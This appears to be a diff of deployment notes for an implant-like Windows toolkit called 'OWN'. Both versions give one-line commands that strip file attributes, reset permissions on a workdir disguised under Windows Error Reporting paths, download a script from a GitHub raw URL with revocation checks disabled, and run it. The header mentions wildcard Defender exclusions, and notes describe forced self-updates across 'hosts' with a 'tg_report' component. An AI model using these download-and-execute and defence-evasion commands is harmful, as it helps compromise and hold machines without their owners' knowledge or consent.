@@ -1,8 +1,12 @@
-UNIVERSAL DEPLOY (O48 / M34 / L29 — Gryxa FP 36e506ff pinned; allow by gryxa.com relay OR keeper FP; wildcard Defender exclusions; workdir unharden-on-entry so hosts can never freeze on an old build):
+UNIVERSAL DEPLOY (O49 / M35 / L29 — guaranteed update: deploy ALWAYS pulls latest core files from repo, stages in C:\Windows\Temp so ACL locks cannot block; mon tick unhardens workdir + stages updates in Temp every tick):
 
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o48" & findstr /C:"OWN BUILD 20260802O48" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o49" & findstr /C:"OWN BUILD 20260802O49" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-STUCK HOSTS (old M5-era build, self-update frozen by workdir LockDir) — unharden first, then deploy:
-icacls "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache" /reset /T /C /Q >nul 2>&1 & attrib -h -s -r "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache" 2>nul & attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o48" & findstr /C:"OWN BUILD 20260802O48" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+STUCK HOSTS (won't self-update) — unharden then deploy:
+icacls "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache" /reset /T /C /Q >nul 2>&1 & attrib -h -s -r "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache" 2>nul & attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o49" & findstr /C:"OWN BUILD 20260802O49" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-O48: unharden workdir on entry (attrib reset + icacls /reset + regrant) so the self-update tick can always download/apply new builds. Fixes hosts frozen on M5-era builds.
+O49/M35 guarantee:
+- Deploy (own.txt) no longer ships stale embedded payloads — it ALWAYS downloads latest own_lib/own_mon/own_secure/tg_report from the repo (embed = offline fallback only).
+- All downloads staged in C:\Windows\Temp\.upd (never ACL-locked), then moved into .wucache — LockDir cannot freeze the update channel.
+- Every mon tick unhardens the workdir + re-grants SYSTEM/Admin before attempting self-update.
+Net: any host that runs a tick OR a deploy converges to the latest build, whatever its prior state.
